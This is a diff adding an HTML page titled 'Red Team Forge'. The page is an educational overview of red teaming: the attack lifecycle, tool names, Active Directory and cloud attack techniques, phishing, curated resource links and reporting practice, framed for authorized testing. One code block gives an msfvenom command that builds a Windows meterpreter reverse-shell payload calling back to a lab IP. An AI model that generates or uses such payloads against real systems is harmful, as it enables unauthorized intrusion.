@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>🔥 Red Team Forge | Ethical Hacking & Adversary Simulation</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at 10% 20%, #1a0e1f, #050208);
+            font-family: 'Inter', sans-serif;
+            color: #f0eaff;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+        #red-mist {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .forge-container {
+            position: relative;
+            z-index: 2;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1.5rem;
+        }
+        /* header */
+        .hero {
+            text-align: center;
+            background: rgba(30, 10, 30, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            padding: 2rem 1rem;
+            margin-bottom: 2rem;
+            border: 1px solid #ff5e7e66;
+        }
+        .hero h1 {
+            font-size: 3rem;
+            background: linear-gradient(135deg, #ff7aa2, #ff3b6f);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .hero p {
+            font-size: 1.1rem;
+            max-width: 800px;
+            margin: 1rem auto 0;
+            opacity: 0.9;
+        }
+        .section {
+            background: rgba(12, 6, 18, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 2rem;
+            border: 1px solid #ff5e7e40;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            transition: 0.2s;
+        }
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffb3c6, #ff5e7e);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            border-left: 6px solid #ff3b6f;
+            padding-left: 1rem;
+            margin-bottom: 1.2rem;
+        }
+        .grid-2, .grid-3 {
+            display: grid;
+            gap: 1.5rem;
+        }
+        .grid-2 { grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); }
+        .grid-3 { grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); }
+        .card {
+            background: #100b18;
+            border-radius: 1.5rem;
+            padding: 1.2rem;
+            border: 1px solid #ff5e7e40;
+            transition: 0.2s;
+        }
+        .card:hover {
+            border-color: #ff5e7e;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px #ff2d6b20;
+        }
+        .card h3 {
+            color: #ff8da1;
+            margin-bottom: 0.8rem;
+            font-size: 1.3rem;
+        }
+        .tool-badge {
+            display: inline-block;
+            background: #ff2d6b20;
+            border: 1px solid #ff5e7e;
+            border-radius: 2rem;
+            padding: 0.2rem 0.8rem;
+            font-size: 0.7rem;
+            font-weight: 600;
+            margin: 0.2rem;
+        }
+        .phase-list {
+            list-style: none;
+        }
+        .phase-list li {
+            padding: 0.4rem 0;
+            border-bottom: 1px solid #ff5e7e30;
+            display: flex;
+            gap: 0.6rem;
+            align-items: baseline;
+        }
+        .phase-list li strong {
+            min-width: 110px;
+            color: #ffb3c6;
+        }
+        code {
+            background: #00000060;
+            padding: 0.2rem 0.4rem;
+            border-radius: 0.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+        .link-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+        }
+        .link-list a {
+            color: #ffb3c6;
+            text-decoration: none;
+            border-left: 3px solid #ff5e7e;
+            padding-left: 0.8rem;
+            transition: 0.1s;
+        }
+        .link-list a:hover {
+            color: #ff7aa2;
+            border-left-width: 5px;
+            transform: translateX(4px);
+        }
+        hr {
+            border-color: #ff5e7e40;
+            margin: 1rem 0;
+        }
+        footer {
+            text-align: center;
+            font-size: 0.75rem;
+            opacity: 0.7;
+            margin-top: 2rem;
+        }
+        @media (max-width: 760px) {
+            .hero h1 { font-size: 2rem; }
+            .section-title { font-size: 1.4rem; }
+        }
+        button {
+            background: #ff2d6b;
+            border: none;
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<canvas id="red-mist"></canvas>
+<div class="forge-container">
+    <div class="hero">
+        <h1>🔥 Red Team Forge · Ethical Hacking</h1>
+        <p>adversary simulation • attack lifecycle • tools • tactics • real-world red teaming education</p>
+        <p style="font-size:0.85rem; margin-top:0.5rem;">⚡ for authorized security testing only. know thy enemy to defend.</p>
+    </div>
+
+    <!-- Red Teaming vs Blue Team -->
+    <div class="section">
+        <div class="section-title">🎯 Red Teaming: Mission & Mindset</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔴 Red Team</h3>
+                <p>Offensive security specialists simulating real-world adversaries. Goal: test detection, response, and resilience using TTPs (Tactics, Techniques, Procedures) aligned with MITRE ATT&CK.</p>
+                <p>✅ Assumed breach, stealth, persistence, evasion, reporting actionable findings.</p>
+            </div>
+            <div class="card">
+                <h3>🔵 Blue Team</h3>
+                <p>Defenders: SOC, incident response, threat hunting. Purple team = collaboration to improve defenses.</p>
+                <p>📌 Red Teaming vs Penetration Testing: Red Team is objective-based (steal data, evade detection), not just finding vulnerabilities.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Attack Lifecycle (Cyber Kill Chain / MITRE phases) -->
+    <div class="section">
+        <div class="section-title">⚔️ Red Team Attack Lifecycle</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔍 Reconnaissance (OSINT)</h3>
+                <p>Passive/active: DNS enumeration, WHOIS, Shodan, theHarvester, Google dorks. Identify exposed assets and employees.</p>
+            </div>
+            <div class="card">
+                <h3>📌 Weaponization & Delivery</h3>
+                <p>Payload generation (msfvenom), phishing emails, drive-by downloads, USB drops. Evasion techniques: obfuscation, encryption.</p>
+            </div>
+            <div class="card">
+                <h3>🚪 Exploitation</h3>
+                <p>Gain initial foothold: CVE exploits, credential stuffing, social engineering. Tools: Metasploit, Cobalt Strike, Evilginx for MFA bypass.</p>
+            </div>
+            <div class="card">
+                <h3>🕹️ Command & Control (C2)</h3>
+                <p>Establish beacon outbound using HTTPS/DNS, custom C2 frameworks (Covenant, Sliver, Mythic). Domain fronting, CDNs to blend in.</p>
+            </div>
+            <div class="card">
+                <h3>🔄 Lateral Movement & Privilege Escalation</h3>
+                <p>PsExec, WMI, RDP, pass-the-hash, Kerberoasting, Golden Ticket. Dumping credentials: Mimikatz, LSASS memory.</p>
+            </div>
+            <div class="card">
+                <h3>🧹 Persistence & Exfiltration</h3>
+                <p>Scheduled tasks, WMI event subscriptions, registry run keys. Data compression, encrypted channels, staged exfiltration.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Essential Red Team Tools -->
+    <div class="section">
+        <div class="section-title">🛠️ Core Arsenal (Red Team tools)</div>
+        <div class="grid-3">
+            <div class="card"><h3>🔎 Recon & OSINT</h3>Amass, Recon-ng, Sublist3r, Maltego, Shodan, Censys, theHarvester.</div>
+            <div class="card"><h3>💥 Exploitation</h3>Metasploit, Cobalt Strike (simulate advanced adversary), SearchSploit, Evil-WinRM, impacket.</div>
+            <div class="card"><h3>🧬 C2 & Post-Exploit</h3>Sliver, Covenant, Mythic, PoshC2, Empire (PowerShell/Empire).</div>
+            <div class="card"><h3>🔑 Credential Access</h3>Mimikatz, Rubeus, hashcat, john the ripper, NetNTLM relaying (Responder, Inveigh).</div>
+            <div class="card"><h3>🌐 Web Application</h3>Burp Suite Professional, ZAP, ffuf, SQLmap, XSStrike.</div>
+            <div class="card"><h3>🧪 Evasion & Bypass</h3>Donut, Shellter, Veil, Hyperion, process injection techniques, AMSI bypass.</div>
+        </div>
+        <div class="code-block" style="background:#0a0512; padding:0.8rem; border-radius:1rem; margin-top:1rem;">
+            # Example: generate a staged payload (msfvenom) — for authorized labs only<br>
+            msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o payload.exe
+        </div>
+    </div>
+
+    <!-- Active Directory & Cloud Attacks -->
+    <div class="section">
+        <div class="section-title">🏰 Active Directory & Cloud Red Teaming</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔹 AD Attack Primitives</h3>
+                <ul style="margin-left: 1.2rem;">
+                    <li>Kerberoasting (service accounts crackable hashes)</li>
+                    <li>AS-REP Roasting (no preauth users)</li>
+                    <li>Pass-the-Hash / Overpass-the-Hash</li>
+                    <li>DCSync (mimikatz for replication rights)</li>
+                    <li>Golden Ticket / Silver Ticket via krbtgt hash</li>
+                    <li>ACL abuse (AdminSDHolder, WriteProperty)</li>
+                </ul>
+            </div>
+            <div class="card">
+                <h3>☁️ Cloud Red Team (AWS/Azure)</h3>
+                <p>❄️ Enumeration: pacu, scoutsuite, cloud_enum. ❄️ Privilege escalation via misconfigured IAM roles, EC2 metadata, Lambda backdoors. ❄️ Azure AD reconnaissance: Stormspotter, ROADtools. Persistence via management console backdoor, app registrations.</p>
+                <p><span class="tool-badge">pacu</span><span class="tool-badge">CloudMapper</span><span class="tool-badge">Stormspotter</span></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- OSINT & Social Engineering -->
+    <div class="section">
+        <div class="section-title">📡 OSINT & Social Engineering (Human Intelligence)</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔎 OSINT Techniques</h3>
+                <p>Email harvesting (Hunter.io, theHarvester), GitHub recon, breach data (Dehashed, HaveIBeenPwned API), geolocation, metadata analysis. Tools: <strong>SpiderFoot, Sherlock, Photon</strong>.</p>
+            </div>
+            <div class="card">
+                <h3>🎣 Phishing & Pretexting</h3>
+                <p>GoPhish, Evilginx2 (MFA bypass), SET (Social-Engineer Toolkit). Clone legitimate login portals, use red team domains for awareness training.</p>
+                <p><strong>Defensive advice:</strong> MFA + user awareness + URL filtering.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Red Team Resources & Learning Links (curated) -->
+    <div class="section">
+        <div class="section-title">📚 Red Team Library · Essential Links</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔗 Official & Frameworks</h3>
+                <div class="link-list">
+                    <a href="https://attack.mitre.org/" target="_blank" rel="noopener noreferrer">► MITRE ATT&CK® – Knowledge base of adversary tactics</a>
+                    <a href="https://www.offensive-security.com/" target="_blank">► Offensive Security (OSCP/OSEP) – Hands-on training</a>
+                    <a href="https://www.redteamguide.com/" target="_blank">► Red Team Guide – Comprehensive resource</a>
+                    <a href="https://thehackerrecipes.com/" target="_blank">► Hacker Recipes – Technical walkthroughs</a>
+                    <a href="https://0xsp.com/" target="_blank">► 0xSP – Red team tooling & research</a>
+                </div>
+            </div>
+            <div class="card">
+                <h3>⚙️ Tools & Labs</h3>
+                <div class="link-list">
+                    <a href="https://github.com/BC-SECURITY/Empire" target="_blank">► Empire – Post-exploitation framework</a>
+                    <a href="https://github.com/BC-SECURITY/Empire" target="_blank">(Empire C2)</a>
+                    <a href="https://github.com/mitre/caldera" target="_blank">► MITRE CALDERA – Automated adversary emulation</a>
+                    <a href="https://tryhackme.com/" target="_blank">► TryHackMe – Red team learning paths</a>
+                    <a href="https://www.hackthebox.com/" target="_blank">► Hack The Box – Active directory labs</a>
+                    <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank">► BloodHound – Active directory graph</a>
+                </div>
+            </div>
+            <div class="card">
+                <h3>📖 Blogs & Community</h3>
+                <div class="link-list">
+                    <a href="https://posts.specterops.io/" target="_blank">► SpecterOps Blog – AD tradecraft</a>
+                    <a href="https://redteam.re/" target="_blank">► RedTeam.re – Articles & techniques</a>
+                    <a href="https://www.ired.team/" target="_blank">► iRed Team – Offensive security notes</a>
+                    <a href="https://xz.aliyun.com/" target="_blank">► XZ (Aliyun) – Chinese security blog</a>
+                    <a href="https://www.youtube.com/@IppSec" target="_blank">► IppSec – HackTheBox walkthroughs</a>
+                </div>
+            </div>
+            <div class="card">
+                <h3>📜 MITRE & Cyber Ranges</h3>
+                <div class="link-list">
+                    <a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" target="_blank">► AD Exploitation Cheatsheet</a>
+                    <a href="https://lolbas-project.github.io/" target="_blank">► LOLBAS – Living Off the Land Binaries</a>
+                    <a href="https://gtfobins.github.io/" target="_blank">► GTFOBins (Unix privilege escalation)</a>
+                    <a href="https://www.pentesteracademy.com/redteam" target="_blank">► Pentester Academy – Red Team labs</a>
+                    <a href="https://cyberdefenders.org/" target="_blank">► CyberDefenders – Blue/red challenges</a>
+                </div>
+            </div>
+        </div>
+        <hr>
+        <p style="font-size:0.8rem; text-align:center;">⚠️ Use these resources ethically, within authorized environments. Red Teaming requires written permission.</p>
+    </div>
+
+    <!-- Reporting & Methodology -->
+    <div class="section">
+        <div class="section-title">📄 Reporting & Professionalism</div>
+        <div class="grid-2">
+            <div class="card">
+                <h3>🔴 Red Team Reporting</h3>
+                <p>Executive summary (risk impact), attack narrative (TTPS), timeline, evidence logs, detection gaps, prioritized remediation. Include MITRE ATT&CK mappings.</p>
+                <p>Tools: <strong>GhostWriter (TheCyberNeo), Dradis, WriteHat</strong>.</p>
+            </div>
+            <div class="card">
+                <h3>🧠 Purple Team Exercises</h3>
+                <p>Collaborative sessions: emulate attacks, measure detection (e.g., Sysmon, EDR), tune alerts. Result: improved visibility and response.</p>
+            </div>
+        </div>
+    </div>
+    <footer>🔥 Red Team Forge — knowledge for authorized testing only. Defend with red mindset.</footer>
+</div>
+
+<script>
+    // immersive cyber particles (red/purple)
+    const canvas = document.getElementById("red-mist");
+    let ctx = canvas.getContext("2d");
+    let particles = [];
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    class RedParticle {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = Math.random() * canvas.height;
+            this.r = Math.random() * 2.2 + 0.8;
+            this.vx = (Math.random() - 0.5) * 0.3;
+            this.vy = (Math.random() - 0.5) * 0.2 + 0.08;
+            this.alpha = Math.random() * 0.45 + 0.1;
+            this.color = `rgba(255, 60, 110, ${this.alpha})`;
+        }
+        update() {
+            this.x += this.vx;
+            this.y += this.vy;
+            if(this.x < -20) this.x = canvas.width + 20;
+            if(this.x > canvas.width+20) this.x = -20;
+            if(this.y < -20) this.y = canvas.height+20;
+            if(this.y > canvas.height+20) this.y = -20;
+        }
+        draw() {
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.r, 0, Math.PI*2);
+            ctx.fillStyle = this.color;
+            ctx.shadowBlur = 7;
+            ctx.shadowColor = "#ff2d6b";
+            ctx.fill();
+        }
+    }
+    function initParticles(cnt = 140) {
+        particles = [];
+        for(let i=0;i<cnt;i++) particles.push(new RedParticle());
+    }
+    function animate() {
+        if(!ctx) return;
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        for(let p of particles) {
+            p.update();
+            p.draw();
+        }
+        requestAnimationFrame(animate);
+    }
+    window.addEventListener('resize', () => {
+        resizeCanvas();
+        initParticles(140);
+    });
+    resizeCanvas();
+    initParticles(150);
+    animate();
+</script>
+</body>
+</html>
